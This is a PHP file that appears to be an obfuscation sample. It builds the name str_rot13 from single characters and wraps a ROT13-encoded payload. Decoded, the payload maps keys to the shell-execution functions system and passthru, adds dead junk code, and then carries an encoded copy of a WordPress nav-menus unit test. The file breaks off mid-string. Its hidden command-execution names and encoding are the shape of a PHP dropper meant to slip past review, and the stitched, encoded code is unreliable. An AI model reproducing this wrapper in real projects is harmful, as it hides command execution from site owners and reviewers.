<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfgf JC_Phfgbzvmr_Ani_Zrahf.
 *
 * @tebhc phfgbzvmr
 */
pynff Grfg_JC_Phfgbzvmr_Ani_Zrahf rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Vafgnapr bs JC_Phfgbzvmr_Znantre juvpu vf erfrg sbe rnpu grfg.
	 *
	 * @ine JC_Phfgbzvmr_Znantre
	 */
	choyvp $jc_phfgbzvmr;

	/**
	 * VQ bs gur nqzvavfgengbe hfre.
	 *
	 * @ine vag
	 */
	choyvp fgngvp $nqzvavfgengbe_vq;

	/**
	 * Frg hc gur funerq svkgher.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel Snpgbel vafgnapr.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzvavfgengbe_vq = $snpgbel->hfre->perngr( neenl( 'ebyr' => 'nqzvavfgengbe' ) );
	}

	/**
	 * Frg hc n grfg pnfr.
	 *
	 * @frr JC_HavgGrfgPnfr_Onfr::frg_hc()
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-phfgbzvmr-znantre.cuc';
		jc_frg_pheerag_hfre( frys::$nqzvavfgengbe_vq );
		tybony $jc_phfgbzvmr;
		$guvf->jc_phfgbzvmr = arj JC_Phfgbzvmr_Znantre();
		$jc_phfgbzvmr       = $guvf->jc_phfgbzvmr;
	}

	/**
	 * Qryrgr gur $jc_phfgbzvmr tybony jura pyrnavat hc fpbcr.
	 */
	choyvp shapgvba pyrna_hc_tybony_fpbcr() {
		tybony $jc_phfgbzvmr;
		$jc_phfgbzvmr = ahyy;
		cnerag::pyrna_hc_tybony_fpbcr();
	}

	/**
	 * Svygre gb nqq phfgbz zrah vgrz glcrf.
	 *
	 * @cnenz neenl $vgrzf Zrah vgrz glcrf.
	 * @erghea neenl Zrah vgrz glcrf.
	 */
	choyvp shapgvba svygre_vgrz_glcrf( $vgrzf ) {
		$vgrzf[] = neenl(
			'gvgyr'      => 'Phfgbz',
			'glcr_ynory' => 'Phfgbz Glcr',
			'glcr'       => 'phfgbz_glcr',
			'bowrpg'     => 'phfgbz_bowrpg',
		);

		erghea $vgrzf;
	}

	/**
	 * Svygre gb nqq phfgbz zrah vgrzf.
	 *
	 * @cnenz neenl  $vgrzf       Gur zrah vgrzf.
	 * @cnenz fgevat $bowrpg_glcr Gur bowrpg glcr (r.t. gnkbabzl).
	 * @cnenz fgevat $bowrpg_anzr Gur bowrpg anzr (r.t. pngrtbel).
	 * @erghea neenl Zrah vgrzf.
	 */
	choyvp shapgvba svygre_vgrzf( $vgrzf, $bowrpg_glcr, $bowrpg_anzr ) {
		$vgrzf[] = neenl(
			'vq'         => 'phfgbz-1',
			'gvgyr'      => 'Pbby ornaf',
			'glcr'       => $bowrpg_glcr,
			'glcr_ynory' => 'Phfgbz Ynory',
			'bowrpg'     => $bowrpg_anzr,
			'hey'        => ubzr_hey( '/pbby-ornaf/' ),
			'pynffrf'    => 'phfgbz-zrah-vgrz pbby-ornaf',
		);

		erghea $vgrzf;
	}

	/**
	 * Grfg pbafgehpgbe.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::__pbafgehpg()
	 */
	choyvp shapgvba grfg_pbafgehpg() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Znantre', $zrahf->znantre );

		$guvf->nffregGehr( nqq_svygre( 'phfgbzvmr_erserfu_abaprf', neenl( $zrahf, 'svygre_abaprf' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'jc_nwnk_ybnq-ninvynoyr-zrah-vgrzf-phfgbzvmre', neenl( $zrahf, 'nwnk_ybnq_ninvynoyr_vgrzf' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'jc_nwnk_frnepu-ninvynoyr-zrah-vgrzf-phfgbzvmre', neenl( $zrahf, 'nwnk_frnepu_ninvynoyr_vgrzf' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'jc_nwnk_phfgbzvmr-ani-zrahf-vafreg-nhgb-qensg', neenl( $zrahf, 'nwnk_vafreg_nhgb_qensg_cbfg' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_pbagebyf_radhrhr_fpevcgf', neenl( $zrahf, 'radhrhr_fpevcgf' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_ertvfgre', neenl( $zrahf, 'phfgbzvmr_ertvfgre' ) ) );
		$guvf->nffregGehr( nqq_svygre( 'phfgbzvmr_qlanzvp_frggvat_netf', neenl( $zrahf, 'svygre_qlanzvp_frggvat_netf' ) ) );
		$guvf->nffregGehr( nqq_svygre( 'phfgbzvmr_qlanzvp_frggvat_pynff', neenl( $zrahf, 'svygre_qlanzvp_frggvat_pynff' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', neenl( $zrahf, 'cevag_grzcyngrf' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_pbagebyf_cevag_sbbgre_fpevcgf', neenl( $zrahf, 'ninvynoyr_vgrzf_grzcyngr' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_cerivrj_vavg', neenl( $zrahf, 'phfgbzvmr_cerivrj_vavg' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_cerivrj_vavg', neenl( $zrahf, 'znxr_nhgb_qensg_fgnghf_cerivrjnoyr' ) ) );
		$guvf->nffregGehr( nqq_npgvba( 'phfgbzvmr_fnir_ani_zrahf_perngrq_cbfgf', neenl( $zrahf, 'fnir_ani_zrahf_perngrq_cbfgf' ) ) );
		$guvf->nffregGehr( nqq_svygre( 'phfgbzvmr_qlanzvp_cnegvny_netf', neenl( $zrahf, 'phfgbzvmr_qlanzvp_cnegvny_netf' ) ) );
	}

	/**
	 * Grfg gung gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq ergheaf n JC_Reebe bowrpg.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_ergheaf_jc_reebe() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Vainyvq cbfg glcr $bow_anzr.
		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'cbfg_glcr', 'vainyvq' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vgrzf );
		$guvf->nffregFnzr( 'ani_zrahf_vainyvq_cbfg_glcr', $vgrzf->trg_reebe_pbqr() );

		// Vainyvq gnkbabzl $bow_anzr.
		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'gnkbabzl', 'vainyvq' );
		$guvf->nffregVafgnaprBs( 'JC_Reebe', $vgrzf );
		$guvf->nffregFnzr( 'vainyvq_gnkbabzl', $vgrzf->trg_reebe_pbqr() );
	}

	/**
	 * Grfg gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq znlor ergheaf gur ubzr cntr vgrz.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_znlor_ergheaf_ubzr() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'vq'         => 'ubzr',
			'gvgyr'      => _k( 'Ubzr', 'ani zrah ubzr ynory' ),
			'glcr'       => 'phfgbz',
			'glcr_ynory' => __( 'Phfgbz Yvax' ),
			'bowrpg'     => '',
			'hey'        => ubzr_hey(),
		);

		// Perngr cntrf.
		frys::snpgbel()->cbfg->perngr_znal( 12, neenl( 'cbfg_glcr' => 'cntr' ) );

		// Ubzr vf vapyhqrq va zrah vgrzf jura cntr vf mreb.
		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'cbfg_glcr', 'cntr', 0 );
		$guvf->nffregPbagnvaf( $rkcrpgrq, $vgrzf );

		// Ubzr vf abg vapyhqrq va zrah vgrzf jura cntr vf ynetre guna mreb.
		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'cbfg_glcr', 'cntr', 1 );
		$guvf->nffregAbgRzcgl( $vgrzf );
		$guvf->nffregAbgPbagnvaf( $rkcrpgrq, $vgrzf );
	}

	/**
	 * Grfg gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq ergheaf cbfg vgrz.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_ergheaf_cbfg_vgrz_jvgu_cntr_ahzore() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Perngr cntr.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Cbfg Gvgyr' ) );

		// Perngr cntrf.
		frys::snpgbel()->cbfg->perngr_znal( 10 );

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'vq'         => \"cbfg-{$cbfg_vq}\",
			'gvgyr'      => 'Cbfg Gvgyr',
			'glcr'       => 'cbfg_glcr',
			'glcr_ynory' => 'Cbfg',
			'bowrpg'     => 'cbfg',
			'bowrpg_vq'  => (vag) $cbfg_vq,
			'hey'        => trg_creznyvax( (vag) $cbfg_vq ),
		);

		// Bssfrg gur dhrel naq trg gur frpbaq cntr bs zrah vgrzf.
		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'cbfg_glcr', 'cbfg', 1 );
		$guvf->nffregPbagnvaf( $rkcrpgrq, $vgrzf );
	}

	/**
	 * Grfg gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq ergheaf cntr vgrz.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_ergheaf_cntr_vgrz() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Perngr cntr.
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr' => 'Cntr Gvgyr',
				'cbfg_glcr'  => 'cntr',
			)
		);

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'vq'         => \"cbfg-{$cntr_vq}\",
			'gvgyr'      => 'Cntr Gvgyr',
			'glcr'       => 'cbfg_glcr',
			'glcr_ynory' => 'Cntr',
			'bowrpg'     => 'cntr',
			'bowrpg_vq'  => (vag) $cntr_vq,
			'hey'        => trg_creznyvax( (vag) $cntr_vq ),
		);

		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'cbfg_glcr', 'cntr', 0 );
		$guvf->nffregPbagnvaf( $rkcrpgrq, $vgrzf );
	}

	/**
	 * Grfg gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq ergheaf cbfg vgrz.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_ergheaf_cbfg_vgrz() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Perngr cbfg.
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Cbfg Gvgyr' ) );

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'vq'         => \"cbfg-{$cbfg_vq}\",
			'gvgyr'      => 'Cbfg Gvgyr',
			'glcr'       => 'cbfg_glcr',
			'glcr_ynory' => 'Cbfg',
			'bowrpg'     => 'cbfg',
			'bowrpg_vq'  => (vag) $cbfg_vq,
			'hey'        => trg_creznyvax( (vag) $cbfg_vq ),
		);

		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'cbfg_glcr', 'cbfg', 0 );
		$guvf->nffregPbagnvaf( $rkcrpgrq, $vgrzf );
	}

	/**
	 * Grfg gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq ergheaf grez vgrz.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_ergheaf_grez_vgrz() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Perngr grez.
		$grez_vq = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Grez Gvgyr' ) );

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'vq'         => \"grez-{$grez_vq}\",
			'gvgyr'      => 'Grez Gvgyr',
			'glcr'       => 'gnkbabzl',
			'glcr_ynory' => 'Pngrtbel',
			'bowrpg'     => 'pngrtbel',
			'bowrpg_vq'  => (vag) $grez_vq,
			'hey'        => trg_grez_yvax( (vag) $grez_vq, 'pngrtbel' ),
		);

		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'gnkbabzl', 'pngrtbel', 0 );
		$guvf->nffregPbagnvaf( $rkcrpgrq, $vgrzf );
	}

	/**
	 * Grfg gur ybnq_ninvynoyr_vgrzf_dhrel zrgubq ergheaf phfgbz vgrz.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ybnq_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_ybnq_ninvynoyr_vgrzf_dhrel_ergheaf_phfgbz_vgrz() {
		nqq_svygre( 'phfgbzvmr_ani_zrah_ninvynoyr_vgrz_glcrf', neenl( $guvf, 'svygre_vgrz_glcrf' ) );
		nqq_svygre( 'phfgbzvmr_ani_zrah_ninvynoyr_vgrzf', neenl( $guvf, 'svygre_vgrzf' ), 10, 4 );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'vq'         => 'phfgbz-1',
			'gvgyr'      => 'Pbby ornaf',
			'glcr'       => 'phfgbz_glcr',
			'glcr_ynory' => 'Phfgbz Ynory',
			'bowrpg'     => 'phfgbz_bowrpg',
			'hey'        => ubzr_hey( '/pbby-ornaf/' ),
			'pynffrf'    => 'phfgbz-zrah-vgrz pbby-ornaf',
		);

		$vgrzf = $zrahf->ybnq_ninvynoyr_vgrzf_dhrel( 'phfgbz_glcr', 'phfgbz_bowrpg', 0 );
		$guvf->nffregPbagnvaf( $rkcrpgrq, $vgrzf );
	}

	/**
	 * Grfg gur frnepu_ninvynoyr_vgrzf_dhrel zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::frnepu_ninvynoyr_vgrzf_dhrel()
	 */
	choyvp shapgvba grfg_frnepu_ninvynoyr_vgrzf_dhrel() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );

		// Perngr cbfgf.
		$cbfg_vqf   = neenl();
		$cbfg_vqf[] = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Frnepu & Grfg' ) );
		$cbfg_vqf[] = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Fbzr Bgure Gvgyr' ) );

		// Perngr grezf.
		$grez_vqf   = neenl();
		$grez_vqf[] = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Qbtf Ner Pbby' ) );
		$grez_vqf[] = frys::snpgbel()->pngrtbel->perngr( neenl( 'anzr' => 'Pngf Qebby' ) );

		// Grfg rzcgl erfhygf.
		$rkcrpgrq = neenl();
		$erfhygf  = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
			neenl(
				'cntrahz' => 1,
				'f'       => 'Guvf Qbrf ABG Rkvfg',
			)
		);
		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf );

		// Grfg cbfgf.
		sbernpu ( $cbfg_vqf nf $cbfg_vq ) {
			$rkcrpgrq = neenl(
				'vq'         => 'cbfg-' . $cbfg_vq,
				'gvgyr'      => ugzy_ragvgl_qrpbqr( trg_gur_gvgyr( $cbfg_vq ) ),
				'glcr'       => 'cbfg_glcr',
				'glcr_ynory' => trg_cbfg_glcr_bowrpg( 'cbfg' )->ynoryf->fvathyne_anzr,
				'bowrpg'     => 'cbfg',
				'bowrpg_vq'  => (vag) $cbfg_vq,
				'hey'        => trg_creznyvax( (vag) $cbfg_vq ),
			);
			jc_frg_bowrpg_grezf( $cbfg_vq, $grez_vqf, 'pngrtbel' );
			$frnepu  = $cbfg_vq === $cbfg_vqf[0] ? 'grfg & frnepu' : 'bgure gvgyr';
			$f       = fnavgvmr_grkg_svryq( jc_hafynfu( $frnepu ) );
			$erfhygf = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
				neenl(
					'cntrahz' => 1,
					'f'       => $f,
				)
			);
			$guvf->nffregFnzr( $rkcrpgrq, $erfhygf[0] );
		}

		// Grfg grezf.
		sbernpu ( $grez_vqf nf $grez_vq ) {
			$grez     = trg_grez_ol( 'vq', $grez_vq, 'pngrtbel' );
			$rkcrpgrq = neenl(
				'vq'         => 'grez-' . $grez_vq,
				'gvgyr'      => $grez->anzr,
				'glcr'       => 'gnkbabzl',
				'glcr_ynory' => trg_gnkbabzl( 'pngrtbel' )->ynoryf->fvathyne_anzr,
				'bowrpg'     => 'pngrtbel',
				'bowrpg_vq'  => (vag) $grez_vq,
				'hey'        => trg_grez_yvax( (vag) $grez_vq, 'pngrtbel' ),
			);
			$f        = fnavgvmr_grkg_svryq( jc_hafynfu( $grez->anzr ) );
			$erfhygf  = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
				neenl(
					'cntrahz' => 1,
					'f'       => $f,
				)
			);
			$guvf->nffregFnzr( $rkcrpgrq, $erfhygf[0] );
		}

		// Grfg svygrerq erfhygf.
		$erfhygf = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
			neenl(
				'cntrahz' => 1,
				'f'       => 'png',
			)
		);
		$guvf->nffregPbhag( 2, $erfhygf ); // Pngrtbel grezf Pngf Qebby naq Hapngrtbevmrq.
		$pbhag = $guvf->svygre_pbhag_phfgbzvmr_ani_zrah_frnepurq_vgrzf;
		nqq_svygre( 'phfgbzvmr_ani_zrah_frnepurq_vgrzf', neenl( $guvf, 'svygre_frnepu' ), 10, 2 );
		$erfhygf = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
			neenl(
				'cntrahz' => 1,
				'f'       => 'png',
			)
		);
		$guvf->nffregFnzr( $pbhag + 1, $guvf->svygre_pbhag_phfgbzvmr_ani_zrah_frnepurq_vgrzf );
		$guvf->nffregVfNeenl( $erfhygf );
		$guvf->nffregPbhag( 3, $erfhygf );
		erzbir_svygre( 'phfgbzvmr_ani_zrah_frnepurq_vgrzf', neenl( $guvf, 'svygre_frnepu' ), 10 );

		// Grfg ubzr.
		$gvgyr   = _k( 'Ubzr', 'ani zrah ubzr ynory' );
		$erfhygf = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
			neenl(
				'cntrahz' => 1,
				'f'       => $gvgyr,
			)
		);
		$guvf->nffregPbhag( 1, $erfhygf );
		$guvf->nffregFnzr( 'ubzr', $erfhygf[0]['vq'] );
		$guvf->nffregFnzr( 'phfgbz', $erfhygf[0]['glcr'] );
	}

	/*
	 * Grfgf gung gur frnepu_ninvynoyr_vgrzf_dhrel zrgubq fubhyq erghea grez vgrzf
	 * abg nffvtarq gb nal cbfgf.
	 *
	 * @gvpxrg 45298
	 */
	choyvp shapgvba grfg_frnepu_ninvynoyr_vgrzf_dhrel_fubhyq_erghea_hanffvtarq_grez_vgrzf() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		ertvfgre_gnkbabzl(
			'jcgrfgf_gnk',
			'cbfg',
			neenl(
				'ynoryf' => neenl(
					'anzr' => 'Grfgf Gnkbabzl',
				),
			)
		);

		$grez_vq = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'jcgrfgf_gnk',
				'anzr'     => 'sbbone',
			)
		);

		// Rkcrpgrq zrah vgrz neenl.
		$rkcrpgrq = neenl(
			'gvgyr'      => 'sbbone',
			'vq'         => \"grez-{$grez_vq}\",
			'glcr'       => 'gnkbabzl',
			'glcr_ynory' => 'Grfgf Gnkbabzl',
			'bowrpg'     => 'jcgrfgf_gnk',
			'bowrpg_vq'  => (vag) $grez_vq,
			'hey'        => trg_grez_yvax( (vag) $grez_vq, '' ),
		);

		$erfhygf = $zrahf->frnepu_ninvynoyr_vgrzf_dhrel(
			neenl(
				'cntrahz' => 1,
				'f'       => 'sbb',
			)
		);

		$guvf->nffregFnzrFrgf( $rkcrpgrq, $erfhygf[0] );
	}

	/**
	 * Pbhag sbe ahzore bs gvzrf phfgbzvmr_ani_zrah_frnepurq_vgrzf svygrerq.
	 *
	 * @ine vag
	 */
	cebgrpgrq $svygre_pbhag_phfgbzvmr_ani_zrah_frnepurq_vgrzf = 0;

	/**
	 * Svygre gb frnepu zrah vgrzf.
	 *
	 * @cnenz neenl $vgrzf Vgrzf.
	 * @cnenz neenl $netf {
	 *     Frnepu netf.
	 *
	 *     @glcr vag    $cntrahz Cntr ahzore.
	 *     @glcr fgevat $f       Frnepu fgevat.
	 * }
	 * @erghea neenl Vgrzf.
	 */
	choyvp shapgvba svygre_frnepu( $vgrzf, $netf ) {
		$guvf->nffregVfNeenl( $vgrzf );
		$guvf->nffregVfNeenl( $netf );
		$guvf->nffregNeenlUnfXrl( 'f', $netf );
		$guvf->nffregNeenlUnfXrl( 'cntrahz', $netf );
		$guvf->svygre_pbhag_phfgbzvmr_ani_zrah_frnepurq_vgrzf += 1;

		vs ( 'png' === $netf['f'] ) {
			neenl_hafuvsg(
				$vgrzf,
				neenl(
					'vq'         => 'ubzr',
					'gvgyr'      => 'PBBY PNG!',
					'glcr'       => 'phfgbz',
					'glcr_ynory' => __( 'Phfgbz Yvax' ),
					'bowrpg'     => '',
					'hey'        => ubzr_hey( '/pbby-png' ),
				)
			);
		}
		erghea $vgrzf;
	}

	/**
	 * Grfg gur radhrhr zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::radhrhr_fpevcgf()
	 */
	choyvp shapgvba grfg_radhrhr_fpevcgf() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );
		$zrahf->radhrhr_fpevcgf();
		$guvf->nffregGehr( jc_fpevcg_vf( 'phfgbzvmr-ani-zrahf' ) );

		jc_qrdhrhr_fglyr( 'phfgbzvmr-ani-zrahf' );
		jc_qrdhrhr_fpevcg( 'phfgbzvmr-ani-zrahf' );
	}

	/**
	 * Grfg gur svygre_qlanzvp_frggvat_netf zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::svygre_qlanzvp_frggvat_netf()
	 */
	choyvp shapgvba grfg_svygre_qlanzvp_frggvat_netf() {
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$rkcrpgrq = neenl( 'glcr' => 'ani_zrah_vgrz' );
		$erfhygf  = $zrahf->svygre_qlanzvp_frggvat_netf( $guvf->jc_phfgbzvmr, 'ani_zrah_vgrz[123]' );
		$guvf->nffregFnzr( $rkcrpgrq['glcr'], $erfhygf['glcr'] );

		$rkcrpgrq = neenl( 'glcr' => 'ani_zrah' );
		$erfhygf  = $zrahf->svygre_qlanzvp_frggvat_netf( $guvf->jc_phfgbzvmr, 'ani_zrah[123]' );
		$guvf->nffregFnzr( $rkcrpgrq['glcr'], $erfhygf['glcr'] );
	}

	/**
	 * Grfg gur svygre_qlanzvp_frggvat_pynff zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::svygre_qlanzvp_frggvat_pynff()
	 */
	choyvp shapgvba grfg_svygre_qlanzvp_frggvat_pynff() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$rkcrpgrq = 'JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat';
		$erfhygf  = $zrahf->svygre_qlanzvp_frggvat_pynff( 'JC_Phfgbzvmr_Frggvat', 'ani_zrah_vgrz[123]', neenl( 'glcr' => 'ani_zrah_vgrz' ) );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf );

		$rkcrpgrq = 'JC_Phfgbzvmr_Ani_Zrah_Frggvat';
		$erfhygf  = $zrahf->svygre_qlanzvp_frggvat_pynff( 'JC_Phfgbzvmr_Frggvat', 'ani_zrah[123]', neenl( 'glcr' => 'ani_zrah' ) );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhygf );
	}

	/**
	 * Grfg gur phfgbzvmr_ertvfgre zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::phfgbzvmr_ertvfgre()
	 */
	choyvp shapgvba grfg_phfgbzvmr_ertvfgre() {
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$zrah_vq = jc_perngr_ani_zrah( 'Cevznel' );
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_gvgyr' => 'Uryyb Jbeyq' ) );
		$vgrz_vq = jc_hcqngr_ani_zrah_vgrz(
			$zrah_vq,
			0,
			neenl(
				'zrah-vgrz-glcr'      => 'cbfg_glcr',
				'zrah-vgrz-bowrpg'    => 'cbfg',
				'zrah-vgrz-bowrpg-vq' => $cbfg_vq,
				'zrah-vgrz-gvgyr'     => 'Uryyb Jbeyq',
				'zrah-vgrz-fgnghf'    => 'choyvfu',
			)
		);
		qb_npgvba( 'phfgbzvmr_ertvfgre', $guvf->jc_phfgbzvmr );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Ani_Zrah_Vgrz_Frggvat', $guvf->jc_phfgbzvmr->trg_frggvat( \"ani_zrah_vgrz[$vgrz_vq]\" ) );
		$guvf->nffregFnzr( 'Cevznel', $guvf->jc_phfgbzvmr->trg_frpgvba( \"ani_zrah[$zrah_vq]\" )->gvgyr );
		$guvf->nffregFnzr( 'Uryyb Jbeyq', $guvf->jc_phfgbzvmr->trg_pbageby( \"ani_zrah_vgrz[$vgrz_vq]\" )->ynory );

		$ani_zrahf_perngrq_cbfgf_frggvat = $guvf->jc_phfgbzvmr->trg_frggvat( 'ani_zrahf_perngrq_cbfgf' );
		$guvf->nffregVafgnaprBs( 'JC_Phfgbzvmr_Svygre_Frggvat', $ani_zrahf_perngrq_cbfgf_frggvat );
		$guvf->nffregFnzr( 'cbfgZrffntr', $ani_zrahf_perngrq_cbfgf_frggvat->genafcbeg );
		$guvf->nffregFnzr( neenl(), $ani_zrahf_perngrq_cbfgf_frggvat->qrsnhyg );
		$guvf->nffregFnzr( neenl( $guvf->jc_phfgbzvmr->ani_zrahf, 'fnavgvmr_ani_zrahf_perngrq_cbfgf' ), $ani_zrahf_perngrq_cbfgf_frggvat->fnavgvmr_pnyyonpx );
	}

	/**
	 * Grfg gur vaginy_onfr10 zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::vaginy_onfr10()
	 */
	choyvp shapgvba grfg_vaginy_onfr10() {

		$zrahf = arj JC_Phfgbzvmr_Ani_Zrahf( $guvf->jc_phfgbzvmr );

		$guvf->nffregFnzr( 2, $zrahf->vaginy_onfr10( 2 ) );
		$guvf->nffregFnzr( 4, $zrahf->vaginy_onfr10( 4.1 ) );
		$guvf->nffregFnzr( 4, $zrahf->vaginy_onfr10( '4' ) );
		$guvf->nffregFnzr( 4, $zrahf->vaginy_onfr10( '04' ) );
		$guvf->nffregFnzr( 42, $zrahf->vaginy_onfr10( +42 ) );
		$guvf->nffregFnzr( -42, $zrahf->vaginy_onfr10( -42 ) );
		$guvf->nffregFnzr( 26, $zrahf->vaginy_onfr10( 0k1N ) );
		$guvf->nffregFnzr( 0, $zrahf->vaginy_onfr10( neenl() ) );
	}

	/**
	 * Grfg gur ninvynoyr_vgrz_glcrf zrgubq.
	 *
	 * @frr JC_Phfgbzvmr_Ani_Zrahf::ninvynoyr_vgrz_glcrf()
	 */
